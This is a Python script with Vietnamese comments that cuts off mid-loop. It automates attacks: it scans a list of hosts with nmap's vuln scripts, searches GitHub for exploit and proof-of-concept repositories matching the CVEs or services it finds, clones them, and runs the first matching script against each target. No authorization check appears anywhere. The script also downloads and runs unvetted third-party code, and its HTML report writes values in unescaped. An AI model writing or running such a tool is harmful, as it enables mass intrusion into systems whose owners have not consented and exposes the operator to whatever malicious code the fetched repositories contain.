import subprocess
import requests
import re
import os
import glob
import csv
from concurrent.futures import ThreadPoolExecutor, as_completed

# ---------------- CONFIG ----------------
MAX_RESULTS = 2           # Số repo tối đa clone mỗi CVE/dịch vụ
SAVE_DIR = "exploits"     # Thư mục lưu repo
FILENAME_KEYWORDS = ["exploit", "poc", "proof"]
MAX_THREADS = 4            # Số luồng đồng thời
REPORT_HTML = "report.html"
REPORT_CSV = "report.csv"
# -----------------------------------------

report_data = []  # Lưu kết quả cho HTML/CSV

def scan_vuln(target):
    print(f"[*] Quét lỗ hổng với Nmap trên {target}...")
    try:
        result = subprocess.check_output(
            ["nmap", "--script", "vuln", "-Pn", target],
            stderr=subprocess.DEVNULL
        ).decode()
    except FileNotFoundError:
        print("[-] Nmap chưa cài. sudo apt install nmap")
        return []

    matches = re.findall(r"(CVE-\d{4}-\d+)", result)
    if not matches:
        services = re.findall(r"^\d+/tcp\s+open\s+([a-zA-Z0-9\-_]+)", result, re.MULTILINE)
        matches = list(set(services))
    return list(set(matches))

def search_github(query):
    print(f"[*] Tìm trên GitHub: {query}")
    url = f"https://api.github.com/search/repositories?q={query}+exploit+poc+proof-of-concept&sort=stars&order=desc"
    r = requests.get(url, headers={"Accept": "application/vnd.github.v3+json"})
    if r.status_code != 200:
        print(f"[-] Lỗi GitHub API: {r.status_code}")
        return []
    data = r.json()
    results = []
    for item in data.get("items", []):
        results.append({
            "name": item["full_name"],
            "url": item["html_url"],
            "git_url": item["clone_url"],
            "stars": item["stargazers_count"],
            "desc": item["description"]
        })
    return results

def clone_repo(git_url, name):
    os.makedirs(SAVE_DIR, exist_ok=True)
    repo_dir = os.path.join(SAVE_DIR, name.replace("/", "_"))
    if os.path.exists(repo_dir):
        print(f"[!] Repo {name} đã tồn tại, bỏ qua.")
        return repo_dir
    print(f"[*] Đang clone {name}...")
    subprocess.run(["git", "clone", "--depth", "1", git_url, repo_dir])
    return repo_dir

def run_exploit(repo_dir, target):
    files = glob.glob(f"{repo_dir}/**/*", recursive=True)
    candidate_scripts = [f for f in files if f.endswith((".py", ".sh", ".pl")) and any(k in f.lower() for k in FILENAME_KEYWORDS)]

    if not candidate_scripts:
        print(f"[-] Không tìm thấy file exploit/PoC khả thi trong {repo_dir}.")
        return "No exploit found"

    for script in candidate_scripts[:1]:
        print(f"[+] Thử chạy: {script}")
        try:
            if script.endswith(".py"):
                subprocess.run(["python3", script, target])
            elif script.endswith(".sh"):
                subprocess.run(["bash", script, target])
            elif script.endswith(".pl"):
                subprocess.run(["perl", script, target])
            return f"Executed: {os.path.basename(script)}"
        except Exception as e:
            print(f"[-] Lỗi khi chạy {script}: {e}")
            return f"Error: {e}"
    return "Skipped"

def process_repo(repo, target, vuln, machine):
    repo_path = clone_repo(repo["git_url"], repo["name"])
    status = "Not run"
    if repo_path:
        status = run_exploit(repo_path, target)

    # Lưu kết quả vào report
    report_data.append({
        "Machine": machine,
        "Vuln": vuln,
        "Repo": repo["name"],
        "Stars": repo["stars"],
        "URL": repo["url"],
        "Description": repo["desc"],
        "ExploitStatus": status
    })

def save_reports():
    # CSV
    with open(REPORT_CSV, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=report_data[0].keys())
        writer.writeheader()
        writer.writerows(report_data)

    # HTML
    html_content = "<html><head><meta charset='UTF-8'><title>Scan Report</title></head><body>"
    html_content += "<h1>Scan Report</h1><table border='1' cellpadding='5'><tr>"
    for col in report_data[0].keys():
        html_content += f"<th>{col}</th>"
    html_content += "</tr>"
    for row in report_data:
        html_content += "<tr>"
        for val in row.values():
            if val.startswith("http"):
                html_content += f"<td><a href='{val}' target='_blank'>{val}</a></td>"
            else:
                html_content += f"<td>{val}</td>"
        html_content += "</tr>"
    html_content += "</table></body></html>"

    with open(REPORT_HTML, "w", encoding="utf-8") as f:
        f.write(html_content)

    print(f"[+] Report đã lưu: {REPORT_CSV}, {REPORT_HTML}")

if __name__ == "__main__":
    file_targets = input("Nhập tên file danh sách IP/hostname (mỗi dòng 1 IP): ").strip()
    if not os.path.exists(file_targets):
        print("[-] File không tồn tại.")
        exit(1)

    with open(file_targets, "r") as f:
        targets = [line.strip() for line in f if line.strip()]

    for TARGET
